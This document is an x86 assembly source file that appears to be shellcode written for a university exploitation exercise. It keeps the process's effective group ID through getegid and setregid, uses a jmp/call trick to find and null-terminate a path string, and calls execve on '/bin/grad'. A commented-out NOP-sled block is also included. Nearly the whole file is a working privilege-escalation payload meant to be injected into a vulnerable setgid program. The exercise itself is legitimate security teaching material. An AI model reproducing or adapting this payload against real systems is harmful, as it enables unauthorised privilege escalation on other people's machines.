#------------------------------------------
#---------Assembler code-------------------
#------------------------------------------

#	.file	"expl1b.c"
#	.section	.rodata
#	.align 4

#.data

#.text
#	.globl main
#	.type	main, @function

#create nops
#.rept 370
#     nop
#.endr

.data

.text
	.globl main
	.type main, @function
#.global getegid

main:
getegid:
	subl	%eax, %eax		#clear eax
	movb	$50, %al		#system call 50, getegid
	int		$0x80			

setregid:
	movl	%eax, %ebx		#set the groupid's
	movl 	%eax, %ecx 		#set the groupid's
	subl	%eax, %eax		#clear eax
	movb	$71, %al
	int		$0x80			#system call 71, setregid

jump:
	jmp		stringy			#need to jump to the 'call'

after_jump:

hello_world:
	sub		%eax, %eax
	sub		%ebx, %ebx
	sub		%edx, %edx
	movb	$4, %al
	movb 	$1, %bl
	mov		(%esp), %ecx
	movb	$5, %dl
	int 	$0x80	

execve_prepare:
	movl	(%esp), %ebx
	sub 	%eax, %eax		#clear eax
	sub		%ecx, %ecx		#clear ecx
	sub		%edx, %edx		#clear edx
	movb	$11, %al

	jmp after_string		#jump to after the string

add_zero:
#	mov		%ecx, -6(%esp)	#add terminating 0 after the string, ecx has to be cleared
	mov		(%esp), %edx
	subb	$6, %dl	
	mov 	%ecx, (%edx)
	sub		%edx, %edx		#clear edx

do_execve:
	int		$0x80			#system call 11, execve	

	subl	%eax, %eax		#clear eax
	subl	%ebx, %ebx		#clear ebx
	movb	$1, %al
	int 	$0x80			#system call 1, exit

stringy:
	call 	after_jump		#jump back so that the string is in the %esp
#	.string	"/home/uebungen/dazur/dazur009/grad"
	.string "/bin/grad"
after_string:
	call add_zero
